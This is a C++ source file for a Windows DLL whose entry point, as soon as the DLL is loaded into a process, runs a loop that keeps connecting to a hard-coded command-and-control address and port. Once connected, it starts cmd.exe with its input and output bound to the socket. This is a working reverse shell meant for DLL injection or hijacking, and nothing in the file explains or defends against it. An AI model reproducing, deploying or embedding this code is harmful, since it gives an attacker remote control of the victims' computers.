// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
#ifndef _WINSOCK_DEPRECATED_NO_WARNINGS
#include <Ws2tcpip.h> // We will use this for InetPton()
#endif

void RunShell(char* C2Server, int C2Port) {
    while (true) {
        Sleep(5000);    // Five Second

        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2, 2), &version);
        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;

        WCHAR wszClassName[256];
        memset(wszClassName, 0, sizeof(wszClassName));
        MultiByteToWideChar(CP_ACP, 0, C2Server, strlen(C2Server) + 1, wszClassName,
            sizeof(wszClassName) / sizeof(wszClassName[0]));
#ifdef _WINSOCK_DEPRECATED_NO_WARNINGS
        addr.sin_addr.s_addr = inet_addr(C2Server);
#else
        InetPton(AF_INET, wszClassName, &addr.sin_addr.s_addr);
        // InetPton(AF_INET, _T("0.0.0.0"), &server.sin_addr.s_addr); // Bind to all interfaces
#endif
        //addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                TCHAR cmd[] = TEXT("C:\\Windows\\System32\\cmd.exe");
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
                CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    return;
                }
            }
        }
    }
}






BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    char host[] = "10.180.217.158";
    int port = 55555;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        RunShell(host, port);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

